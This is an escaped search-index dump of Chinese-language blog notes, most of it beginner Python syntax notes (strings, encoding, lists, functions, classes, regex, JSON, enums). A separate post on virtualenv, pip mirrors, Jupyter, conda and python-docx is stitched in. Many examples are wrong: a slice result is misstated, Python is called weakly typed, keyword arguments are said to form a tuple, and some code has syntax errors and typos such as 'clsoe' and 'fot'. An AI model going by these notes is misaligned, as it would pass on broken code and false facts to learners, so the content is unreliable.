\u0026ldquo;hello\u0026rdquo;\n这时Python解释器干了两件事情：\n在内存中创建了一个\u0026rsquo;hello\u0026rsquo;的字符串；\n在内存中创建了一个名为a的变量，并把它指向\u0026rsquo;hallo\u0026rsquo;。\n可以把一个变量a赋值给另一个变量b，这个操作实际上是把变量b指向变量a所指向的数据\n因为程序是从上往下执行的，一定要理清逻辑\n常量就是不能变的变量，在python中使用大写表示一个常量，例如： ABC =123\n但这个常量还是可以被修改，因为Python没有任何机制可以保证该常量不会被改变，这个很奇怪\n/除法计算结果是浮点数，即使是两个整数恰好整除，结果也是浮点数\n当使用//除法时，两个整数的相除就可以是整数\n想要做精确的除法，就必须使用/了\n// 除，永远是整数\n字符编码 python提供了字符转编码函数ord()和编码转字符函数chr()\nPython可以使用编码来输出内容\nPython的字符串类型是str，在内存中以Unicode表示，一个字符对应若干个字节，可以转成bytes类型，方便传输和保存数据\n在Python中bytes类型的数据用带b前缀的单引号或双引号表示：a = b\u0026quot;hallo word\u0026rdquo;\nstr和bytes类型内容显示没有差别，但是bytes的每个字符都只占用一个字节\n在Python中，可以使用encode()方法来指定编码，例如： \u0026lsquo;hallo\u0026rsquo;.encode(\u0026lsquo;ascii\u0026rsquo;) b\u0026rsquo;hallo\u0026rsquo;\n注意：纯英文的str可以使用ASCII编码为bytes，显示内容一样，但是包含了其他语言（比如中文）的str不能使用ASCII编码，Python会报错，含有其他语言的str请使用UTF-8编码\n如果想把bytes转为str，可以使用decode()方法\n注意：如果bytes中包含无法解码的字节，decode()方法会报错\n如果bytes中只有一小部分无效的字节，可以传入errors=\u0026lsquo;ignore\u0026rsquo;忽略错误的字节\n计算str包含多少个字符，可以用len()函数\nlen()函数计算的是str的字符数，如果换成bytes，len()函数就计算字节数 为了让Python按UTF-8编码读取，一般都会在文件开头声明一下： # !/usr/bin/python3 # \u0026ndash; coding: utf-8 \u0026ndash;\n第一行是告诉计算机系统这是一个Python可执行程序，注意Windows会忽视这个\n第二行是告诉Python，请按照UTF-8编码读取源代码\n注意：声明并不代表文件是UTF-8编码的，请确保文本编辑器使用UTF-8 without BOM编码\n如果想一些内容可以根据变量变化，那么就用到格式化字符串\n在Python中，采用的格式化方式和C语言是一致的，用%实现\n\u0026lsquo;Hello, %s $%d \u0026rsquo; % (\u0026lsquo;world\u0026rsquo;)\n常见的占位符有：\n%d \u0026ndash; 整数 %f \u0026ndash; 浮点数 %s \u0026ndash; 字符串 %x \u0026ndash; 十六进制整数\n注意：%s永远起作用，它会把任何数据类型转换为字符串！！！\n如果字符串里面的%只是普通字符，那么使用%%来代表一个%（转义）\n还有一个格式化字符串方法：format()\n它会用传入的参数依次替换字符串内的占位符{0}、{1}\u0026hellip;\u0026hellip;..\n例如：\n\u0026lsquo;hello,{0}\u0026rsquo;.format(\u0026lsquo;world\u0026rsquo;)\nPython 3的字符串使用Unicode，直接支持多语言\n当str和bytes互相转换时，需要指定编码\n列表（list），一种有序的集合，可以随时添加和删除其中的元素，使用[]来表示，例如： abc = [\u0026lsquo;a\u0026rsquo;,\u0026lsquo;b\u0026rsquo;,\u0026lsquo;c\u0026rsquo;]\n可以使用索引来访问列表的每一个元素，索引是从0开始，例如：\nabc[0] \u0026lsquo;a\u0026rsquo;\n注意：索引超出范围时，Python会抛出一个IndexError错误，记得最后一个元素的索引是len(classmates) - 1\n如果想获取最后一个元素，不知道索引，又怕抛出错误，可以使用-1方法，例如：\nabc[-1] c\n以此类推，可以获取倒数第2个、倒数第3个，-2，-3\n因为这个列表是可变的有序的列表，所以可以在列表中追加元素到末尾，例如：\nabc.append(\u0026rsquo;d\u0026rsquo;) abc [\u0026lsquo;a\u0026rsquo;,\u0026lsquo;b\u0026rsquo;,\u0026lsquo;c\u0026rsquo;,\u0026rsquo;d\u0026rsquo;]\n当然也可以添加元素到指定的位置，例如：\nabc.insert(1,\u0026lsquo;1\u0026rsquo;) abc [\u0026lsquo;a\u0026rsquo;,\u0026lsquo;1\u0026rsquo;,\u0026lsquo;b\u0026rsquo;,\u0026lsquo;c\u0026rsquo;,\u0026rsquo;d\u0026rsquo;]\n删除列表末尾元素，使用pop()方法，例如：\nabc.pop() \u0026rsquo;d\u0026rsquo; abc [\u0026lsquo;a\u0026rsquo;,\u0026lsquo;1\u0026rsquo;,\u0026lsquo;b\u0026rsquo;,\u0026lsquo;c\u0026rsquo;]\n删除指定位置的元素，使用pop()，括号中填写索引位置\nabc.pop(1) \u0026lsquo;1\u0026rsquo; abc [\u0026lsquo;a\u0026rsquo;,\u0026lsquo;b\u0026rsquo;,\u0026lsquo;c\u0026rsquo;]\n如果想把某个元素换成其他元素，可以直接赋值给对应的索引位置，例如：\nabc[0]=\u0026lsquo;abc\u0026rsquo; abc [\u0026lsquo;abc\u0026rsquo;,\u0026lsquo;b\u0026rsquo;,\u0026lsquo;c\u0026rsquo;]\n列表里面的元素数据类型可以不同，例如：\na = [\u0026lsquo;hallo\u0026rsquo;,666,False]\n列表里面可以包含其他列表，反复嵌套，例如：\na = [\u0026lsquo;hallo\u0026rsquo;,\u0026lsquo;word\u0026rsquo;,[\u0026lsquo;123\u0026rsquo;.\u0026lsquo;abc\u0026rsquo;]]\n注意：这个a列表只有3个元素，其中的a[2]又是一个列表，可以拆开理解，例如：\n123 = [\u0026lsquo;hallo\u0026rsquo;,\u0026lsquo;word\u0026rsquo;]\nabc = [\u0026lsquo;666\u0026rsquo;,123,\u0026lsquo;abc\u0026rsquo;]\n想拿到\u0026rsquo;hallo\u0026rsquo;,可以写成123[1]或者abc1\n这个可以看成一个二维数组\n注意：当一个列表中一个元素也没有，那么就是一个空的列表，长度为0，a=[] len(a) 0\n还有一个有序列表叫元组（tuple），和list很相似，不过这个一但初始化就不能修改\n没有添加元素和删除元素的方法，但是可以正常使用获取元素的方法，获取方法和list一样，就是不能赋值成另外的元素\n那么这个列表不能改变，那么有什么意义？因为tuple不可变，所以程序更安全\n当定义一个tuple时，在定义的时候，tuple的元素就必须被确定下来\n如果要定义一个空的tuple，可以写成()\n正确定义只有一个元素的tuple，例如：\na = (1,) a 1\n为啥这样呢？因为括号()可以表示tuple，又可以表示数学公式中的小括号，防止Python按照小括号来计算，避免歧义\n关于可以\u0026rsquo;改变\u0026rsquo;的tuple：实际上改变的是list，因为tuple里面可以有list列表，所以可以\u0026rsquo;改变'01\n全局变量和局部变量\n一般在函数内部定义的变量，为局部变量，在函数外部定义的变量为全局变量\n因为作用域的问题，一般在函数内部不能真正修改到全局变量\n可以使用关键字global来处理\nabc = None\rdef xyz():\rglobal abc\rabc=\u0026quot;hallo\u0026quot;\rreturn a\rprint(abc) // 观察这个变量和下面的变量的区别\rprint(xyz())\rprint(abc) // 观察这个变量和上面的变量的区别\rnonlocal 可以用于在函数或者其他作用域中使用上层（非全局）的变量，例如：\ndef xyz():\rabc=\u0026quot;hallo\u0026quot;\rdef go():\rnonlocal abc\rreturn abc\rreturn go()\rprint(xyz())\r函数\n调用函数 函数名()\npython中内置了大量的函数，可以直接调用，例如：\nint(\u0026ldquo;666\u0026rdquo;) // 666\n因为函数本身可以理解为是一个引用类型，所以函数是可以赋值给变量，例如：\na = int a(\u0026ldquo;123\u0026rdquo;) // 123\n定义函数\ndef为定义一个函数的关键字，定义一个函数例如： def abc(i): print(i)\n如果有一个函数定义在另一个文件里，可以在当前文件的当前目录下，使用from abstest import导入函数\n空函数： def no(): pass\npass语句用于什么都不干，可以用于占位\n检查函数传入的参数\n检查数据类型可以使用isinstance()\nisinstance(1,int) // 返回布尔值，可以搭配if判断语句使用\n如果想要手动设置异常，可以使用raise语句，例如：\ndef no(i):\rif not isinstance(i,(int)):\rraise ValueError(\u0026quot;no函数的传参必须为整数\u0026quot;)\rno('1')\r函数内部可以使用return来返回函数结果\n使用return返回不了值，主要是没有把值取出来，例如\ndef a(x):\rreturn x\rb = a(1)\rprint(b) // 1\rpython的函数参数灵活度很高\ndef a(x,i=1) // 默认i为1\n必选参数在前，默认参数在后，当不需要默认参数可以直接覆盖掉，灵活性很高\n当参数的个数不明确时，可以把参数当成list或tuple传进来，例如：\ndef a(x):\rabc = 0\rfor a in x:\rabc=abc+a\rreturn abc\ra = a([1,2,3])\rprint(a) // 6\r如果已经有一个list或tuple，想传进来：\ndef xyz(*x):\rabc = 0\rfor a in x:\rabc=abc+a\rreturn abc\rb = [1,3,5]\ra = xyz(*b)\rprint(a)\r关键字参数可以传入0或者任意个参数，而这些参数会变成一个tuple\ndef abc(i,**n): print(\u0026lsquo;i:\u0026rsquo;, i, \u0026rsquo;n:\u0026rsquo;, n)\nabc(\u0026ldquo;abc\u0026rdquo;)\n如果已经有一个tuple，想传入： b = {1,3,5} abc(**b)\n如果想限制关键字参数，例如：\ndef xyz(i,n,*,name,age):\rprint(i,n,name,age)\rxyz(1,2,name=\u0026quot;hallo\u0026quot;,age=18) // 1 2 hallo 18\r*后面的参数被认为是命名关键字参数，限制只能使用该参数名\n如果参数中已经有了可变参数，后面跟着的命名关键字参数就不需要*来分隔了\n命名关键字参数必须要传入参数名，否则报错，如果命名关键字参数已经有默认值，可以不用传入\n递归函数\n递归函数就是这个函数反复调用它本身，例如：\n从1加到100，1+2+3+\u0026hellip;+100\ndef xyz(n):\rif n == 1:\rreturn 1\rreturn n+xyz(n-1)\ra = xyz(100)\rprint(a) // 5050\r尾递归优化\n递归调用次数过多，会导致堆栈溢出，溢出就是超出了最大上限的堆栈\n而解决因为递归而导致的溢出的方法就是尾递归优化\n但是Python解释器目前不支持尾递归优化，就算使用尾递归方式，也还是会导致堆栈溢出\ndef abc(n):\rreturn xyz(n,1)\rdef xyz(n,go):\rif n == 1:\rreturn go\rreturn xyz(n-1,n+go)\ra = abc(100)\rprint(a)\r切片，顾名思义，就是取部分值，例如：\na = [1,2,3,4,5]\na[0:3] // [1,2,3]\n索引从0开始，到3为止\n支持倒数切片\na[:-1] // [1,2,3,4]\n如果开头为0，可以省略不写，倒数第一个为-1\na[::2] // [1, 3, 5] 每两个取一个\na[:] // 复制一个一样的list\ntupel也可以使用切片，但是操作结果还是tuple\na = (0,1,2,3)\na[:3] // (0,1,2)\n甚至连字符串都可以切片，结果还是字符串\na = \u0026ldquo;hallo\u0026rdquo;\na[:2] // hallo\n迭代\n读写文件\nabc = open(\u0026lsquo;1.txt\u0026rsquo;,\u0026lsquo;r\u0026rsquo;) go = abc.read(6) # 可以指定读取的数量，如果为空则读取全部 print(go) abc.clsoe() # 这个用来关闭文件\nr为只读，w为写入，a为追加，rb为以二进制方式只读，wb为以二进制方式写入，ab为以二进制方式追加\nabc = open(\u0026lsquo;1.txt\u0026rsquo;,\u0026lsquo;w\u0026rsquo;) abc.write(\u0026ldquo;hallo word!!\u0026rdquo; * 6) # 写入6条数据 abc.close()\nabc = open(\u0026lsquo;1.txt\u0026rsquo;,\u0026lsquo;r\u0026rsquo;) data = abc.readline() print(\u0026ldquo;3:%s\u0026rdquo; % data) # 读取指定行数的数据，这里为读取3行数据 abc.close()\n如果想多钱全部数据，并且返回的是一个列表，列表的每一个元素为都为每一行数据，可以： abc = open(\u0026lsquo;1.txt\u0026rsquo;, \u0026lsquo;r\u0026rsquo;) data = data.readlines() print(type(data)) for a in data: print(a) data.close()\nif判断\ndata = 10\rif data \u0026gt;=18:\rprint(\u0026quot;成年了!\u0026quot;)\relif data\u0026gt;=6:\rprint(\u0026quot;义务教育\u0026quot;)\relse:\rprint(\u0026quot;未成年!!!\u0026quot;)\r输入输出\ndata = int(input(\u0026quot;请输入数据\u0026quot;))\rprint(data)\r类型转换（Python是弱类型语言，弱类型指不能对变量声明类型，只能声明数据的类型）\nint()整数,str()字符串,float()浮点数,bool()布尔数，list()列表，tuple()元组，chr()字符，unichr()Unicode字符等等\n例如：\ndata1 = \u0026quot;123\u0026quot;\rdata2 = 123\rprint(isinstance(data1,str))\rprint(isinstance(data2,int))\rdata3 = int(data1)\rdata4 = str(data2)\rprint(isinstance(data3,int))\rprint(isinstance(data4,str))\r运算符\n+加，-减，*乘，/除，//取整除，%取余，**指数\n优先级和普通的算数规则一样，指数大于乘和除,取余,取整除大于加和减\n字符串不能和整数相加，必须将字符串或者整数转换，字符串为拼接，整数为算数\n赋值运算符\n=，将右边赋值给左边的变量，可以给多个变量赋值，例如：a = b = c = 666或者a,b,c = 666,123,100\na+=1 ：a=a+1，a-=1：a=a-1，a*=1：：a=a*1，a/=1：：a=a/1,a//=1: ：a=a//1,a%=1：a=a%1 ,a**=1：a=a**1\n==比较是否相等，!=比较不相等，\u0026gt;大于，\u0026lt;小于，\u0026gt;=大于等于，\u0026lt;=小于等于\nand和运算符（只有当比较全部为true才为true，否则都为false），or或运算符（只有当比较有一个为true才为true，全部为false才为false），not取反运算符（只有当比较为true才为false，当比较为false才为true）\nfor循环和while循环\nfor循环可以遍历任何以序列排序的东东，比如列表和字符串\nfor a in \u0026quot;hallo word\u0026quot;:\rprint(a)\r或者\nfot a in range(1,100):\rprint(a)\rrange支持3个参数，分别是起始，结束，以及步长\nwhile循环,在某个条件下为true下才会执行里面的语句\ndata = 0\rwhile data \u0026lt; 10:\rprint(data)\rdata+=1\r获取字符串或者列表的长度，len(data)\n查找某些内容是否在字符串的某些地方中存在（如果不存在，返回-1）,find(str,beg=0,end=len(strdata))\nstr为要查找的字符串，beg开始查找的位置，end结束查找的位置\n错误处理\n读取文件错误（当文件不存在时） try: abc = open(\u0026lsquo;data.txt\u0026rsquo;, \u0026lsquo;r\u0026rsquo;) print(abc.read()) except FileNotFoundError: print(\u0026lsquo;文件没有找到,请检查文件名称是否正确\u0026rsquo;)\ntry\u0026hellip;except语句可以处理程序运行过程中可能出现的异常\n面向对象\nclass ClassName():\r'test 定义类'\rname = 'hallo'\rage = 20\rdef abc(self): # 实例方法\rprint(self.name)\rprint(self.age)\rclassName = ClassName() # 实例化类\rclassName.abc() # 调用类的方法\r导入类\nfrom hallo import ClassName\rclassName = ClassName() # 实例化类\rclassName.abc() # 调用类的方法\r构造函数\nclass ClassName():\rname = 'hallo'\rage = 20\rdef __init__(self, name，age):\rself.name = name\rself.age = age\ra = ClassName('hahaha', 18)\rb = ClassName('abc', 100)\rprint(a.name)\rprint(a.__dict__)\rprint(b.name)\rprint(ClassName.name)\rclass ClassName():\rname = 'hallo'\rage = 20\rsum = 0\rdef __init__(self, name，age):\rself.name = name\rself.age = age\rself.__class__.sum += 1 # 每调用一次构造函数就触发+1\rprint(self.__class.sum)\r类方法\nclass ClassName():\rsum = 0\r@classmethod\rdef Sum(cls):\rcls.sum += 1\rprint(cls.sum)\rClassName.Sum()\r静态方法\nclass ClassName():\r＠staticmethod\rdef hallo(name, pass):\rprint(name,pass)\rClassName.hallo('hallo','123456')\rabc = ClassName()\rabc.hallo('hhhhh','666123')\r类的成员的公开性与私有性\nclass ClassName():\rname = 'hallo'\rage = 20\r__pass = ''\rdef __abc(self): # 给类的成员开头加上__将表示该成员是私有的，无法在类外部使用\rprint(self.name)\rprint(self.age)\r注意: 如果前后都有__，则表示公开的，如构造函数__init__，只有开头有__才是私有的，默认是公开的\nPython提供一种私有保护机制，当在类外部使用时，Python会将其认为是全新的，私有的是无法被更改的，例如：\nclass ClassName():\rname = 'hallo'\rage = 20\r__pass = '123'\rdef abc(self):\rprint(self.name)\rprint(self.age)\rclassname = ClassName()\rclassname.__pass = '123456'\rprint(classname.__dist__)\rprint(classname._classname__pass) # 实质是访问类里面的私有__pass\r可以看到原来的__pass变成了_classname__pass这个全新的名称，而显示__pass是新的'12345\u0026rsquo;\n类的继承\nclass ClassName():\rdef __init__(self):\rself.a = 123\rself.b = 666\rdef hhh(self):\rprint('hallo word')\rdef gogo(self):\rprint('hallo abc')\rclass Hallo(ClassName):\rdef __init__(self):\rsuper().__init__() # 调用父类的__init__，当子类重写的父类的方法后，还想调用父类原来的方法，可使用super()，该语句块实质上也是在重写的父类的__init__方法，因此需要在子类的__init__调用父类原来的__init__\rdef abc(self):\rreturn self.a + self.b # 继承父类的属性\rdef gogo():\rprint('hallo python') # 重写父类的gogo方法\rhallo = Hallo() hallo.hhh # 调用父类的hhh方法 hallo.a # 调用父类的属性\n正则表达式\n判断某个字符串中是否存在某个字符\nimport re\rabc = \u0026quot;hallo word\u0026quot;\rxyz = re.findall(\u0026quot;hallo\u0026quot;,abc)\rif len(xyz) \u0026gt; 0:\rprint(\u0026quot;字符串包含hallo\u0026quot;)\relse:\rprint(\u0026quot;字符串不包含hallo\u0026quot;)\r筛选出某个字符串中存在的数值\nimport re\rabc = \u0026quot;0hallo1 word2\u0026quot;\rxyz = re.findall('\\d',abc)\rprint(xyz)\r\\d是元字符，\\d也是概括字符集，\\d可以使用[0-9]实现相同的效果\n字符集\nimport re\rabc = \u0026quot;aha, aca, ada, aaa, aea\u0026quot;\rxyz = re.findall('a[ha]a',abc)\r// xyz = re.findall('a[^ha]a',abc) // aea，^是取反\r// xyz = re.findall('a[c-e]a',abc) // aca，ada，aea，c-e表示c，d，e\rprint(xyz) // aha和aaa\r数量词\nimport re\rabc = \u0026quot;hallo word hhhhhh\u0026quot;\rxyz = re.findall('[a-z]{3,6}',abc) // 数量词使用{}包括，3,6表示匹配3到6个字符\rprint(xyz)\r贪婪与非贪婪\n匹配会最大匹配，像上面的数量词的例子，hallo并没有因为3而匹配hal，而是最大匹配，直到匹配的字符不符合才停止，这就是贪婪匹配\nimport re\rabc = \u0026quot;hallo word hhhhhh\u0026quot;\rxyz = re.findall('[a-z]{3,6}?',abc)\rprint(xyz)\r上面的例子就是非贪婪的，匹配会最小匹配\n匹配0次或无限次\nimport re\rabc = \u0026quot;aba abcc abccd abc\u0026quot;\rxyz = re.findall('abc*',abc)\rprint(xyz)\r匹配1次或无限次\nimport re\rabc = \u0026quot;aba abcc abccd abc\u0026quot;\rxyz = re.findall('abc+',abc)\rprint(xyz) // abcc，abccd，abc\r匹配0次或1次\nimport re\rabc = \u0026quot;aba abcc abccd abc\u0026quot;\rxyz = re.findall('abc?',abc)\rprint(xyz) // abc abc abc\r边界匹配符\n由于匹配只针对最小匹配，最大匹配无效，例如\nimport re\rabc = \u0026quot;123456789\u0026quot;\rxyz = re.findall('\\d{3,6}',abc)\rprint(xyz) // 123456，明明不符合6，但是还是输出了\r边界匹配符就是解决这个问题的\nimport re\rabc = \u0026quot;123456789\u0026quot;\rxyz = re.findall('^\\d{3,6}$',abc) // ^表示该位置开始匹配，$表示该位置结束匹配\rprint(xyz) 组\nimport re\rabc = \u0026quot;abc abc xyz hallo abc abc xyz word\u0026quot;\rxyz = re.findall('(abc)(xyz)',abc)\rprint(xyz) json反序列化（json字符串转python字典）\nimport json\rabc = '{\u0026quot;name\u0026quot;: \u0026quot;admin\u0026quot;, \u0026quot;pass\u0026quot;:\u0026quot;abc123\u0026quot;}'\rxyz = json.loads(abc)\rprint(type(xyz)) // dict字典\rprint(xyz) print(xyz['name']) print(xyz['pass']) json序列化（python字典转json字符串）\nimport json\rabc = [\r{\u0026quot;name\u0026quot;: \u0026quot;admin\u0026quot;, \u0026quot;pass\u0026quot;:\u0026quot;abc123\u0026quot;},\r{\u0026quot;name\u0026quot;: \u0026quot;root\u0026quot;, \u0026quot;pass\u0026quot;:\u0026quot;1234567\u0026quot;}\r]\rxyz = json.dumps(abc)\rprint(type(xyz)) // str字符串\rprint(xyz) 枚举\nfrom enum import Enum\rclass ABC(Enum):\rID = 1\rUSER = 2\rPASS = 3\rprint(ABC.ID)\rprint(type(ABC.ID)) // ABC类型\rprint(ABC.ID.name) // 枚举名称\rprint(ABC.ID.value) // 枚举值\rprint(ABC.ID == ABC.USER) // 枚举的比较，不支持大小比较，只支持等值比较\rprint(ABC.ID in ABC.USER)\rfor i in ABC.__members__.items():\rprint(i) // 遍历枚举名称和值，如果只要枚举名称，则去掉.items()\r枚举和类的区别：枚举值不可变，枚举具备防止枚举名称重复的功能\n","permalink":"https://99999.fun/posts/28/","summary":"安装python\n推荐安装anaconda3（linux）\nwget https://mirrors.tuna.tsinghua.edu.cn/anaconda/archive/Anaconda3-2021.05-Linux-x86_64.sh\ndash Anaconda3-2019.10-Linux-x86_64.sh\n根据提示安装，如果还是系统自带的python\nsudo gedit ~/.bashrc\nexport PATH=\u0026quot;/home/pc/anaconda3/bin:$PATH\u0026quot;\npc为系统的用户名，请修改成自己的系统用户名，请勿在root用户下安装anaconda3\n注意：如果使用anaconda3，请设置Path环境变量，/Anaconda3，/Anaconda3/Scripts，/Anaconda3brary/bin，这3个路径都需要设置\nWindows和mac 到官网下载安装包，直接下一步安装\nmac安装了Homebrew，可以使用brew install python3\nWindows设置环境变量，PATH 安装路径\n现在liunx一般都会自带有python3,如果没有可以安装一下\napt install python3\nyun install python3\n注意一下python2.x和python3.x这两个版本是不兼容的，要区分开\n检查是否安装成功，在命令行或者终端输入python3 回车 没有反应或者报错就说明没有安装成功或者可能出问题了 Windows的一定要注意PATH系统变量\n因为Python语言从规范到解释器都是开源的，所以存在多个解释器\n例如CPython，安装python3.x时就可以直接获取到一个官方版本的解释器：CPython，因为是使用C语言开发的，所以叫CPython\n在命令行或者终端，输入输入python3 回车，如果出现了\u0026raquo;\u0026gt; 那么当前状态是python的交互模式\n在交互模式下输入exit()，退出python的交互模式\n在交互模式下执行第一个程序 print(\u0026ldquo;hello,world\u0026rdquo;)\n回车输出hello，world，这是简单的打印字符串\n除了使用交互模式执行程序，又可以使用.py，在命令行或者终端下 python hello.py，如果报错，请检查程序是否出错或者该文件是否在当前目录下\n交互模式可以直接输出结果，但是使用.py文件却不会，想要输出结果，必须使用print()打印出来\n一个好的开发工具往往可以达到事半功倍的效果，例如pycharm和Visual Studio Code，我使用的是Visual Studio Code\nprint()接受多个输出，使用“,”分隔开，也可以输出整数\n当你想让用户输入一点东西的时候，python提供了一个input()，用法如下 name = input() 将输入的值存放到一个变量里\ninput()还提供了提示功能，显示一个字符串，例如：input(\u0026ldquo;xxxxx\u0026rdquo;)\n我想知道这个变量的内容咋办，可以在交互模式下直接输入变量名，回车，就可以查看该变量的内容 又可以使用print()打印下来\n那么什么是变量呢？\n在计算机程序中，变量不仅可以为整数或浮点数，还可以是字符串\n输入是Input，输出是Output，输入输出统称为Input/Output，或者简写为IO\n以#开头的语句是注释，注释是给人看的，解释器会忽略掉注释，注释可以是任何内容\n其他每一行都是一个语句，当语句以冒号:结尾时，缩进的语句视为代码块\n注意：python区分大小写，搞错了大小写，程序可能会报错。缩进建议使用4个空格\npython能直接处理的有：整型，浮点型，字符串，布尔值，空值，变量，常量\npython可以处理整型任意大小的整数，也可以使用二进制代表整数、\n浮点型就是小数，使用科学记数法表示时，一个浮点数的小数点位置是可变的，所以小数又叫浮点型，表示很大或很小的浮点数，必须用科学计数法表示\n字符串是使用\u0026quot;\u0026ldquo;和\u0026rsquo;\u0026lsquo;括起来的任意文本，\u0026lsquo;\u0026lsquo;或\u0026quot;\u0026ldquo;本身只是一种表示方式，不是字符串的一部分","title":"python基础语法笔记"},{"content":"Virtualenv是一个能创建隔绝的独立的Python虚拟环境工具。它能够建立多个相互独立，互不影响的Python工作环境\n用来创建一套独立于系统Python环境的虚拟环境，在虚拟环境下，使用pip安装的依赖都会安装到当前的虚拟环境中，对系统的python环境没有影响\n当开发多个Python程序时当，程序1要使用3.6环境，但是程序2要使用3.8环境时，Virtualenv可以完美解决这个问题\nWindows pip install virtualenvwrapper-win\n使用pip安装Virtualenv\npip3 install virtualenv\n然后创建一个Virtualenv虚拟环境\nvirtualenv webpy #webpy为虚拟环境目录名，目录名自定义\nvirtualenv -p python环境路径 虚拟环境名 #创建指定Python环境路径的虚拟环境\nvirtualenv \u0026ndash;no-site-packages 虚拟环境名 #创建一个干净的Python虚拟环境，系统Python环境的所有第三方包不会复制过来\nvirtualenv \u0026ndash;no-site-packages \u0026ndash;python=版本名 虚拟环境名 #创建一个指定python版本的虚拟环境\nworkon # 输出所有虚拟环境名 Windows\nworkon 虚拟环境名 # 进入虚拟环境 Windows\nsource 文件夹路径 # 激活当前virtualenv并进入虚拟环境\n或者进入虚拟环境目录的bin目录，输入source activate\nWindows是在虚拟环境目录下的Scripts目录，输入activate\ndeactivate # 退出当前环境\n在虚拟环境下，使用pip安装的所有第三方包都会安装到当前的虚拟环境中，不会对系统的Python环境进行\u0026quot;污染\u0026quot;\n想要删除某一个虚拟环境时，只需要将虚拟环境的目录删除\npip使用国内源\n清华：https://pypi.tuna.tsinghua.edu.cn/simple 豆瓣：http://pypi.douban.com/simple/ 中国科技大学 https://pypi.mirrors.ustc.edu.cn/simple/\n临时使用 pip3 install -i https://pypi.tuna.tsinghua.edu.cn/simple pandas\nlinux下\n配置永久使用\ncd ~ # 进入用户目录 mkdir .pip # 新建一个隐藏文件夹 touch pip.conf # 新建一个文件 nano pip.conf # 编辑文件，这里使用nano，可以使用其他编辑器，例如vim\n在文件中添加 [global] index-url = https://pypi.tuna.tsinghua.edu.cn/simple\nwindows下\n配置永久使用\n在user目录下创建一个pip目录\n在该目录新建一个pip.ini文件\n在文件中添加 [global] index-url = https://pypi.tuna.tsinghua.edu.cn/simple [install] trusted-host = pypi.tuna.tsinghua.edu.cn\njupyter\n最简单的安装方法就是使用python的科学计算包\u0026mdash;-Anaconda\n该发行版中包含了大量的科学包，其中就附带了jupyter\n可以通过 pip 来安装 pip install jupyter notebook\n启动notebook服务器也很简单，在终端使用jupyter notebook命令就可以了‘’\n服务器的默认地址是http://localhost:8888\n通过点击“New”，来新建文件夹或者文档\n通过ctrl+c来关闭服务器\n修改jupyter默认工作路径\n在终端使用jupyter notebook \u0026ndash;generate-config\n输出一个路径的文件，修改这个文件\n找到#c.NotebookApp.notebook_dir = ''\n修改成c.NotebookApp.notebook_dir = \u0026lsquo;你想要修改到的那个工作目录的路径\u0026rsquo;\n这个工作目录必须提前创建好，否则可能出现闪退\n修改默认浏览器\n同样在终端使用jupyter notebook \u0026ndash;generate-config\n如果你已经知道这个文件在哪里可以不用，这个命令只是让我们找到jupyter的配置文件，jupyter_notebook_config.py\n找到#c.NotebookApp.notebook_dir = ''\n在它的后面加入\nimport webbrowser\rwebbrowser.register(\r\u0026quot;Microsoft Edge\u0026quot;, None, webbrowser.GenericBrowser(u\u0026quot;\u0026quot;C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\u0026quot;\u0026quot;)\r)\rc.NotebookApp.browser = \u0026quot;Microsoft Edge\u0026quot;\r路径要修改为浏览器的路径\nconda\nconda有两个，一个是anaconda，另一个是miniconda\nanaconda是集成（包含）了一些科学计算包，而miniconda是你要用什么就装什么\nMiniconda 是一个 Anaconda 的轻量级版本，默认只包含了 python 和 conda，但是可以通过 pip 和 conda 来安装所需要的包。\n这里安装的minicoda\nwget https://repo.anaconda.com/miniconda/Miniconda3-latest-Linux-x86_64.sh\nbash Miniconda3-latest-Linux-x86_64.sh\n如果是新机器，一路yes就可以了\n创建环境\nconda create \u0026ndash;name webpy python=3.7 // 建立一个名叫py37的环境，指定Python版本为Python3.7的最新版本\n激活环境\nactivate webpy // 用于Windows系统 source activate webpy // 用于mac或者linux系统\npython \u0026ndash;version // 检查Python版本\n退出当前环境 deactivate webpy // 用于Windows系统 source deactivate webpy // 用于mac或者linux系统\nconda remove \u0026ndash;name webpy \u0026ndash;all // 删除指定环境\nconda info -e // 查看系统的所有环境\nconda install numpy // 安装numpy库\nconda list // 查看已经安装好的库\nconda list -n webpy // 查看指定环境已经安装好的库\nconda install -n webpy numpy // 安装库到指定环境内\nconda update -n webpy numpy // 指定环境更新指定库\nconda remove -n webpy numpy // 删除指定环境中的指定库\nconda update anaconda // 更新anaconda\nconda update python // 更新Python\n添加国内镜像来提升下载速度（使用清华镜像站）\nconda config \u0026ndash;add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free/ conda config \u0026ndash;add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/main/ conda config \u0026ndash;set show_channel_urls yes\ndocx模块（操作Word）\n导入模块 from docx import Document from docx.shared import Inches\n初始化Document对象 document = Document() Document(\u0026ldquo;1.docx\u0026rdquo;)\n写入标题，段落样式由level控制，范围0到9，默认为1 document.add_heading(text=\u0026ldquo;hallo word\u0026rdquo;,level=9)\n写入段落，段落样式由style控制 data = document.add_paragraph(text=\u0026ldquo;https://xiaochenabc123.test.com/\u0026quot;,style=None)\n插入段落到现有段落中，段落样式由style控制 data.insert_paragraph_before(text=\u0026ldquo;abcxyz\u0026rdquo;,style=None)\n插入图片,并且缩小图片英寸为1.6 document.add_picture(\u0026ldquo;1.jpg\u0026rdquo;,width=Inches(1.6))\n插入表格，rows是指定行数，cols是指定行数，style为表格样式 table = document.add_table(rows=1,cols=3,style=\u0026ldquo;Table Grid\u0026rdquo;)\n插入列表中第一行的单元格\nmaincells = table.rows[0].cells maincells[0].text = \u0026ldquo;id\u0026rdquo; maincells[1].text = \u0026ldquo;user\u0026rdquo; maincells[2].text = \u0026ldquo;pass\u0026rdquo;\n初始化 data_cells =( [1,\u0026ldquo;root\u0026rdquo;,\u0026ldquo;a\u0026rdquo;], [2,\u0026ldquo;admin\u0026rdquo;,\u0026ldquo;b\u0026rdquo;], [3,\u0026ldquo;user\u0026rdquo;,\u0026ldquo;c\u0026rdquo;] )\n写入 for item in data_cells: maincells_rows = table.add_row().cells maincells_rows[0].text = str(item[0]) maincells_rows[1].text = item[1] maincells_rows[2].text = item[2]\n保存 document.save(\u0026ldquo;hallo.docx\u0026rdquo;)\ndocx样式\n导入模块\nfrom docx import Document from docx.shared import Pt from docx.shared import RGBColor from docx.oxml.ns import qn\n初始化Document对象 document = Document(\u0026ldquo;1.docx\u0026rdquo;)\n插入页眉 header = document.sections[0].header\nheader.add_paragraph(\u0026ldquo;hallo python\u0026rdquo;)\n插入页脚 footer = 